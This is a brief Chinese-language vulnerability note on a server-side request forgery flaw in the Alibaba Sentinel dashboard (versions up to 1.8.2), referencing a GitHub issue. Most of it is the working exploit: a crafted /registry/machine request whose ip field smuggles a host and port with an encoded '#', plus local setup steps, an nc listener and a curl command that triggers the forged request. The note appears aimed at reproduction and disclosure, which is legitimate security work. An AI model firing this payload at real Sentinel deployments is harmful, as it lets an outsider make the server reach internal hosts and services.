### SSRF
影响范围：
Sentinel <= 1.8.2
```
/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=localhost:12345%23&port=0
```

> 到github拉取开源代码https://github.com/alibaba/Sentinel
> 运行Sentinel/sentinel-dashboard/src/main/java/com/alibaba/csp/sentinel/dashboard/DashboardApplication.java即可启动sentinel-dashboard后台
> 本地监听12345端口，nc -lvvp 12345
> 发起对本地localhost端口为12345的SSRF GET攻击，curl -XGET 'http://127.0.0.1:8080/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=localhost:12345%23&port=0'


Ref:
- https://github.com/alibaba/Sentinel/issues/2451
